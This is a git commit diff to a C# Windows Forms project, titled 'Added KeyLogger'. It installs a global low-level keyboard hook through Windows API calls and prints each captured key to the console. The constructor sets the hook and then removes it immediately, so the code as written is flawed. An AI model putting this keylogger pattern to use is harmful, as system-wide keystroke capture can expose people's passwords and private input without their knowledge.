ac559b18593fa5cfa826689b0d78a8161923854f
Estian <estianyssel@gmail.com>
2019-05-16 13:22:30 +0200

    Added KeyLogger to Program.cs

--- KeyboardHook/Form2.cs
+++ KeyboardHook/Form2.cs
@@ -18,52 +18,65 @@ namespace KeyboardHook
     {
 
         //Get Import code from pinvoke.net for each hook method used.
-        [DllImport("user32.dll", SetLastError = true)]
-        private static extern IntPtr SetWindowsHookEx(int hookId, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
 
-        [DllImport("user32.dll", SetLastError = true)]
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool UnhookWindowsHookEx(IntPtr hhk);
 
-        [DllImport("user32.dll")]
-        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
 
-        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
-        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,IntPtr wParam, IntPtr lParam);
 
-        //Create a Low-Level keyboard process
-        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        //Initialize Low Level keyboard key, and key down
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
         private const int WH_KEYBOARD_LL = 13;
+
         private const int WM_KEYDOWN = 0x0100;
 
-        //Initialize Low-Level Keyboard procedure and hookID
-        private LowLevelKeyboardProc _proc;
+        private static LowLevelKeyboardProc _proc = HookCallback;
+
         private static IntPtr _hookID = IntPtr.Zero;
 
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
+
         {
+
             using (Process curProcess = Process.GetCurrentProcess())
+
             using (ProcessModule curModule = curProcess.MainModule)
+
             {
+
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+
                     GetModuleHandle(curModule.ModuleName), 0);
 
-
             }
+
         }
 
-        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam, Form2 form)
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
+
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+
             {
+
                 int vkCode = Marshal.ReadInt32(lParam);
-                
-                form.writeKeys(Convert.ToString((Keys)vkCode));
+
+                Console.WriteLine((Keys)vkCode);
+
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
+
         }
 
 
@@ -76,13 +89,14 @@ namespace KeyboardHook
         public Form2()
         {
             InitializeComponent();
-            
+            _hookID = SetHook(_proc);
+            UnhookWindowsHookEx(_hookID);
+
         }
 
         private void Form2_Load(object sender, EventArgs e)
         {
-            _hookID = SetHook(_proc);
-            UnhookWindowsHookEx(_hookID);
+            
             
             
         }     
